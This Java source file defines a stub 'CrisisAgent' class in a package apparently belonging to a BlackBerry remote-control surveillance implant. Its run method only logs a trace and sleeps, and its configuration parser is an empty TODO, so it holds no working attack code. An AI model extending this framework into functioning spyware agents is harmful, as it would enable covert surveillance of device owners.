package com.ht.rcs.blackberry.agent;

import com.ht.rcs.blackberry.utils.Debug;
import com.ht.rcs.blackberry.utils.DebugLevel;

public class CrisisAgent extends Agent {
	//#debug
    static Debug debug = new Debug("CrisisAgent", DebugLevel.VERBOSE);

    public CrisisAgent(boolean agentStatus) {
        super(Agent.AGENT_CRISIS, agentStatus, true);
    }

    protected CrisisAgent(boolean agentStatus, byte[] confParams) {
        this(agentStatus);
        parse(confParams);
    }

    public void actualRun() {
        // #debug
        debug.trace("run");
        this.sleepUntilStopped();

    }

    protected boolean parse(byte[] confParameters) {
        // TODO Auto-generated method stub
        return false;
    }

}
